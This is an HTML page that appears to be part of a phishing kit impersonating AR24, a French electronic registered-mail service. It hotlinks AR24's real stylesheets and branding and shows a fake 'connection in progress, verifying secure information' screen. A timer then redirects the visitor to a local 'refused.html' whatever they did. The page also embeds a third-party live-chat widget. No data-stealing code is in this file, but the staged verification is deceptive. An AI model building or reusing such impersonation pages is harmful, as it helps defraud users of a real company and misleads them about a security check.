<!DOCTYPE html>
<html lang="fr" class="no-js">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <title>Vérification en cours - AR24</title>
    <link
      rel="stylesheet"
      href="https://app.ar24.fr/static/min/?f=css/reset.css,css/design-system.css,fonts/font-barlow.css,fonts/font-montserrat.css&1771239617"
    />
    <link
      href="https://app.ar24.fr/static/css/pages/user-login.css?v=1771239617"
      rel="stylesheet"
      type="text/css"
    />
    <style>
      .status-wrapper {
        min-height: calc(100vh - 260px);
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 32px 16px;
      }

      .status-card {
        width: min(100%, 560px);
        padding: 40px 32px;
        border-radius: 28px;
        background: #ffffff;
        box-shadow: 0 24px 60px rgba(17, 24, 39, 0.12);
        text-align: center;
      }

      .loader-title {
        margin: 0;
        font-family: 'Montserrat', sans-serif;
        font-size: clamp(3rem, 8vw, 5.5rem);
        font-weight: 700;
        letter-spacing: 0.15em;
        color: #0000ff;
        animation: ar24-color 1s ease-in-out infinite;
      }

      .status-message {
        margin: 20px 0 8px;
        font-family: 'Montserrat', sans-serif;
        font-size: clamp(1.2rem, 2.4vw, 1.8rem);
        font-weight: 700;
        color: #101828;
      }

      .status-submessage {
        margin: 0;
        color: #667085;
        font-size: 1rem;
      }

      .progress-dots {
        display: inline-flex;
        gap: 8px;
        margin-top: 24px;
      }

      .progress-dots span {
        width: 10px;
        height: 10px;
        border-radius: 50%;
        background: rgba(0, 0, 255, 0.22);
        animation: pulse 1.2s infinite ease-in-out;
      }

      .progress-dots span:nth-child(2) {
        animation-delay: 0.2s;
      }

      .progress-dots span:nth-child(3) {
        animation-delay: 0.4s;
      }

      @keyframes ar24-color {
        0% {
          color: #0000ff;
        }
        50% {
          color: #8f8f8f;
        }
        100% {
          color: #0000ff;
        }
      }

      @keyframes pulse {
        0%,
        80%,
        100% {
          transform: scale(0.85);
          opacity: 0.45;
        }
        40% {
          transform: scale(1.1);
          opacity: 1;
          background: #0000ff;
        }
      }
    </style>
      <link rel="stylesheet" href="css/auth-modern.css" />
  </head>
  <body class="guest">
    <header id="header">
      <div class="wrapper">
        <a href="#" class="header-logo">AR24 - Lettre Recommandée Électronique</a>
      </div>
    </header>

    <main id="main-content">
      <div class="status-wrapper">
        <section class="status-card" aria-live="polite">
          <h1 class="loader-title">AR24</h1>
          <p class="status-message">Connexion en cours...</p>
          <p class="status-submessage">Vérification des informations sécurisées avant l'accès à votre espace.</p>
          <div class="progress-dots" aria-hidden="true">
            <span></span>
            <span></span>
            <span></span>
          </div>
        </section>
      </div>
    </main>

    <footer id="footer">
      <div class="wrapper">
        <div class="top">
          <div class="logo">
            <img alt="" src="/static/images/logo/AR24.svg" />
          </div>
          <div class="line">
            <div>Votre solution d'envoi de recommandés électroniques fiable, pratique et efficace.</div>
            <div>AR24 est une filiale de Docaposte</div>
          </div>
        </div>
      </div>
    </footer>

    <script>
      window.setTimeout(() => {
        window.location.href = 'refused.html';
      }, 3500);
    </script>
    <script src="//code.tidio.co/7infjs1hu3tvvi6swicmo9klmhijsizg.js" async></script>
  </body>
</html>
